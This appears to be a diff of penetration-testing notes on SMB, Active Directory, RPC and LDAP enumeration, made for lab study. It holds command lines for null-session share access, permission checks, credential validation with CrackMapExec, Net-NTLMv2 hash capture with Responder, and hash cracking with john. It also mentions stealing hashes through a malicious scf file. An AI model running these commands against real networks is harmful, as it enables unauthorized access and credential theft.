@@ -11,62 +11,73 @@
 
 > [!] NOTE: NetBIOS session service facilitates authentication aross a windows workgroup or domain and provides access to resources (such as files and printers) 
 
-## Active Directory Enumeration {-}
-
-As soon as we see port 88 and 389 or if victime machine changed the port number and we see Kerberos and LDAP, Attacker can estimate that the 
-victim machine is a Domain Controller.
-
-If we already have credentials, we can enumerate the Active Directory with the bloodhound package
-
-1. Install bloodhound injester
-    
-    ```bash
-    python -m venv venv
-    source venv/bin/activate
-    pip install bloodhound
-    ```
-
-1. Run enumeration
-
-    ```bash
-    bloodhound-python -d victim.local -u username -p "Password" -gc machine.victim.local -c all -ns 10.10.10.11
-    ```
-
-1. New json files have been created in your working directory
-
-    ```bash
-    ls -la *.json
-    ```
-
-1. Install bloodhound and neo4j
-
-    ```bash
-    sudo apt install neo4j bloodhound
-    ```
-
-1. configure neo4j service
-
-    ```bash
-    sudo neo4j console
-    ```
-
-
 ## Map SAMBA exposed shared resources with smbmap {-}
 
 ```bash
 smbmap -H 10.10.10.10 -u " " -p " "
 ```
 
-## SMB connection with smbclient {-}
+## SMB connection with smbclient and smbmap {-}
+
+**smbclient** is a tool that allows attacker to enumerate and list the shared resources of a machine that have the smb service on. 
+You can start by using smbclient with a Null session by using the `-N` argument
 
 ```bash
-smbclient //10.10.10.10/<READ ONLY Desired resource>
+smbclient -L 10.10.10.10 -N
+```
+
+As soon as you have listed those resources you can use **smbmap** to check the access, read or write rights that you have. You can also
+specify the Null session by using the `-u 'null'` argument
+
+```bash
+smbmap -H 10.10.10.10 -u 'null'
+```
+
+As soon as you find a resource that you can access, you can use **smbclient** to connect to it. Again you can use the `-N` argument to tell
+smbclient that you want to connect without asking for credentials.
+
+```bash
+smbclient //10.10.10.10/<Accessible resource>
 ```
 
 > [!] NOTE: smbclient don't provide you a shell but a tool. **get filename.txt** allows you to download a resource if you are connected
 
+If you see that you have access to the desired resource, you can mount the shared directory to your attacker machine.
 
-## Enumerate machines by SAMBA with crackmapexec {-}
+```bash
+mkdir /mnt/smbvictim
+mount -t cifs "//10.10.10.10/<Accessible resource>" /mnt/smbvictim
+```
+
+> [!] NOTE: A mounted partition is not a download of victim folders and file. That's only an access pass. Type `unmount /mnt/smbmounted` to close the
+> mounted share. 
+
+One interesting point with smb is that there is some specified rights at the smb level that can varied. That means that it's not because the
+shared resource is on READ ONLY mode that all the folders that this resource contains can not have a write right. You can check if some repository of 
+this resource are writable with the **smbcacls** tool. The interesting right that we want to check is the Everyone.
+
+```bash
+smbcacls "10.10.10.10/<Accessible resource>" Users/amanda -N
+```
+The output will look as following:
+
+```{r, echo = FALSE, fig.cap="smbcacls read right", out.width="90%"}
+knitr::include_graphics("images/cacls-read.png")
+```
+
+It's interesting to mount the resource in the attacker machine because can do a one liner loop to check multiple folders rights filtering the information
+by the Everyone key word.
+
+```bash
+cd /mnt/smbvictim/Users
+ls -l | awk 'NF{print $NF}' | while read directory; do echo -e "\n[+] Directory $directory; smbcacls "10.10.10.10/<Accessible resource>" Users/$directory -N | grep -i everyone ; done
+```
+
+If you find a directory that have writable rights, something that can be intersting to check is that if you create a file in it, is somebody 
+manipulating it (remove it, writing on it, removing his content etc.). If it's the case, attacker have a way of stolling the hash NTLMv2 with
+malicious **scf** file
+
+## Enumerate machines and check user validity by SAMBA with CME {-}
 
 **CrackMapExec** (a.k.a **CME**) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks.
 
@@ -74,13 +85,19 @@ smbclient //10.10.10.10/<READ ONLY Desired resource>
 cme smb 192.168.0.0/24
 ```
 
-If we have credentials of a user, and this one have admin priviledges on machines, You can use **CrackMapExec** to check those priviledges.
-If it's the case, you will see a (Pwn3d!) in the result.
+**CME** can also enumerate a single machine,
 
 ```bash
-cme smb 192.168.0.0/24 -u 'user' -p 'password1'
+cme smb 10.10.10.10
 ```
 
+If we have credentials of a user, you can use **CME** to check the validity of a user. If the user with the password exists, the tool will 
+write a red plus sign, if not, a minus sign. And if the user exists and this one have admin priviledges on machines, **CrackMapExec** will 
+return a red plus sign and you will see a (Pwn3d!) in the result.
+
+```bash
+cme smb 10.10.10.10 -u 'user' -p 'password1'
+```
 
 ## Sniffing traffic for SAMBA Relay with responder {-}
 
@@ -93,7 +110,7 @@ cd /usr/share/responder
 python3 Responder.py -I eth0 -rdw
 ```
 
-As soon as a connection is launched, you can see the communication. And because the SAMBA is not signed you can then get the **Hash Net-NTLMv2** of the user.
+As soon as a connection is launched, you can see the communication. And because the SAMBA is not signed you can then get the **Hash Net-NTLMv2** of users.
 
 ```{r, echo = FALSE, fig.cap="Hash Net-NTLMv2 Sniffing", out.width="90%"}
 knitr::include_graphics("images/ad-hashnetntlmv2.png")
@@ -106,3 +123,44 @@ What attacker can do with this hash?
     ```bash
     john --wordlist=/usr/share/wordlists/rockyou.txt hashes
     ```
+
+## RPC connection with rpcclient {-}
+
+**Remote Procedure Call** aka **RPC** is a network protocol that allows to make calls of precedures on an external computer with an 
+application server. This protocol is used in a client-server model in order to ensure the communication between the client, the server and
+between possible intermediaries.
+
+In the enumeration phase, attacker can check if it's possible to connect with a null session using the **rpcclient** with the `-U ""` arguments
+
+```bash
+rpcclient -U "" 10.10.10.10 -N
+```
+
+The connection with a valid user will be done as following
+
+```bash
+rpcclient -U "user%password" 10.10.10.10 -c <command>
+```
+
+Interesting command to execute with rpcclient are:
+
+```bash
+rpcclient -U "user%password" 10.10.10.10 -c 'enumdomusers'
+rpcclient -U "user%password" 10.10.10.10 -c 'enumdomgroups'
+# get the rid of domain admins -> 0x200 in this example
+rpcclient -U "user%password" 10.10.10.10 -c 'querygroupmem 0x200'
+# get the rid of the users -> 0x1f4 for example
+rpcclient -U "user%password" 10.10.10.10 -c 'queryuser 0x1f4'
+
+
+```
+
+## Enumerate ldap service with nmap {-}
+
+```bash
+locate .nse | grep "ldap"
+```
+
+```bash
+nmap --script ldap\* 10.10.10.10 -oN ldapScan
+```
